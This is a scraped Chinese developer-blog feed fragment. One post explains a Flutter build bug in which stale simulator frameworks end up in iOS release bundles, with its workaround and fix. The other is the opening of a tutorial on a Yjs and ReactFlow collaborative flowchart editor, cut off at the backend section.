                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你近期已经升级到 3.38.1 之后的版本，包括 3.38.5 ，你就有概率发现，打包提交 iOS 的包会出现 <code>The binary is invalid</code> 的相关错误，简单来说，就是<strong>App Store 拒绝了某个二进制文件，因为它包含了无效的内容</strong>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9585031a3c14094ab8a605f51ac9d39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768181060&amp;x-signature=eDefuga9QaYrBrP%2BGYTuQhm2GD0%3D" alt="" loading="lazy"/></p>
<p>那么这个内容是怎么来的？大概率是模拟器架构的 Framework 被错误地打包进了正式发布的 App ，具体原因还要提到最新版本增加的 Native Assets 功能。</p>
<p>Native Assets 的目标是<strong>让在 Flutter/Dart 包中集成 C、C++、Rust 或 Go 代码，可以像集成普通 Dart 包一样简单</strong>，也就是它允许 Dart 包定义如何构建和打包原生代码，开发者不需要深入了解每个平台的底层构建系统，也是 Dart FFI 未来的重要基建。</p>
<blockquote>
<p>详细可见：<a href="https://juejin.cn/post/7521356618174545962" target="_blank" title="https://juejin.cn/post/7521356618174545962">《Flutter 里的 Asset Transformer 和 Hooks ，这个实验性功能有什么用》</a></p>
</blockquote>
<p>那它怎么导致了这次这个低级问题的出现？实际上这是一个构建脚本逻辑缺陷导致的“脏构建”问题，当 Flutter 构建依赖于 Native Assets（比如 <code>sqlite3</code> 等库）的 Plugin 时，这些原生资源会被编译并输出到 <code>build/native_assets/$platform</code> 目录（例如 <code>build/native_assets/ios</code>）。</p>
<p>因为在现有的构建脚本（<code>xcode_backend.dart</code>）在打包时，会简单粗暴地将 <code>build/native_assets/ios</code> 目录下的<strong>所有</strong>框架复制到最终的 App Bundle (<code>Runner.app/Frameworks</code>) ，例如：</p>
<ul>
<li>先运行了模拟器跑应用，这时模拟器专用的框架（如 <code>sqlite3arm64ios_sim.framework</code>）就会被生成并留在了 <code>build/native_assets/ios</code> 目录</li>
</ul>

<ul>
<li>接着，开发者在<strong>没有运行 <code>flutter clean</code></strong> 的情况下，直接运行了 Release 构建</li>
<li>构建脚本会把之前遗留的“模拟器框架”也一并复制进了 Release 包</li>
<li>App Store 检测到 Release 包中含有模拟器架构的代码，因此拒绝接收</li>
</ul>
<blockquote>
<p>所以说，大厂也有大厂的草台。</p>
</blockquote>
<p>当然，这个问题解决起来也很简单，就是发布前 <code>flutter clean</code> 清理一下，当然，如果你之前打过包了，<strong>那么 Xcode 的构建缓存也需要清理下</strong>，因为可能存在即使你通过 <code>flutter clean</code> 删除了 Flutter 的构建产物，但是 Xcode 可能仍然认为某些中间文件（Intermediate Build Files）存在可用。</p>
<blockquote>
<p>比如 DerivedData 缓存</p>
</blockquote>
<p>那么这么低级的问题，修复下也很简单，所以 sqlite3 的作者也提交了一个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fflutter%2Fflutter%2Fpull%2F179251" target="_blank" title="https://github.com/flutter/flutter/pull/179251" ref="nofollow noopener noreferrer">#179251</a> ，简单来说就是，针对 Native Assets ：</p>
<ul>
<li>读取构建过程中生成的 <code>native_assets.json</code> 文件</li>
<li>解析文件，获取当前构建<strong>真正引用</strong>的依赖列表</li>
<li><strong>仅复制</strong> <code>native_assets.json</code> 中列出的框架，忽略目录中残留的其他无关文件（如模拟器文件）</li>
</ul>
<p>这个修复其实很简单，但是在流程上，因为目前 PR 还缺少 integration test ，所以一直卡在了等待 Review 阶段，除非有人申请豁免，不然这个 PR 的合并还会继续卡着。</p>
<p>只能说，一代人有一代人的草台。</p>
<h2 data-id="heading-0">参考链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fflutter%2Fflutter%2Fissues%2F178602" target="_blank" title="https://github.com/flutter/flutter/issues/178602" ref="nofollow noopener noreferrer">github.com/flutter/flu…</a></li>
</ul>

<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fflutter%2Fflutter%2Fpull%2F179251" target="_blank" title="https://github.com/flutter/flutter/pull/179251" ref="nofollow noopener noreferrer">github.com/flutter/flu…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一杯茶时间带你基于 Yjs 和 reactflow 构建协同流程图编辑器 😍😍😍]]></title>    <link>https://juejin.cn/post/7591330139083898895</link>    <guid>https://juejin.cn/post/7591330139083898895</guid>    <pubDate>2026-01-05T01:14:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591330139083898895" data-draft-id="7334653735358890025" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一杯茶时间带你基于 Yjs 和 reactflow 构建协同流程图编辑器 😍😍😍"/> <meta itemprop="keywords" content="前端,后端,面试"/> <meta itemprop="datePublished" content="2026-01-05T01:14:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一杯茶时间带你基于 Yjs 和 reactflow 构建协同流程图编辑器 😍😍😍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T01:14:07.000Z" title="Mon Jan 05 2026 01:14:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>通过前面几篇文章，我们深入学习了 Yjs 的核心概念、y-protocols 协议、y-websocket 网络同步和 y-indexeddb 本地持久化。现在让我们把这些知识串联起来，从零开始构建一个真实可用的协同流程图编辑器。</p>
<p>想象一下这样的场景：多个用户同时打开同一个流程图，拖动节点、创建连接、实时看到彼此的光标位置，就像在同一块白板上协作一样流畅。这就是我们要实现的效果。这个案例会涵盖协同编辑的核心场景：数据同步、状态管理、光标协同，以及前后端的完整实现。</p>
<p>在开始之前，先提供 github 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FFlowSync" target="_blank" title="https://github.com/xun082/FlowSync" ref="nofollow noopener noreferrer">FlowSync</a></p>
<blockquote>
<p>⚠️ 说明: 本项目是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a> 项目协同编辑功能的基础实现示例。如果你想学习更完整的协同编辑解决方案（包括富文本编辑、权限管理、AI 集成等企业级功能），请访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow 项目</a>。</p>
</blockquote>
<p>如果想参与 DocFlow 开发或者想学习更详细的 Tiptap 和 Yjs 协同原理的，可以添加我微信获取更详细的了解：<code>yunmz777</code></p>
<h2 data-id="heading-0">项目架构</h2>
<p>让我们先看看整体架构。这个协同流程图应用由三个核心部分组成：前端使用 React + ReactFlow 构建可视化流程图界面，后端使用 NestJS 搭建 WebSocket 服务器处理协同逻辑，Yjs 作为协同引擎在前后端之间同步数据。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9919b6a2175f4bf1a4179be302c0a968~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=rKgG5S5ILaCeZpOu%2BtRqsDQaOIM%3D" alt="20260105084942" loading="lazy"/></p>
<p>前端负责用户交互和视图渲染，Yjs Doc 存储流程图的节点和连接数据，WebsocketProvider 负责与服务器建立连接并同步数据。后端的 WebSocket Server 接收来自多个客户端的消息，协调它们之间的数据同步，WSSharedDoc 存储每个房间的文档状态。</p>
<h2 data-id="heading-1">后端实现</h2>
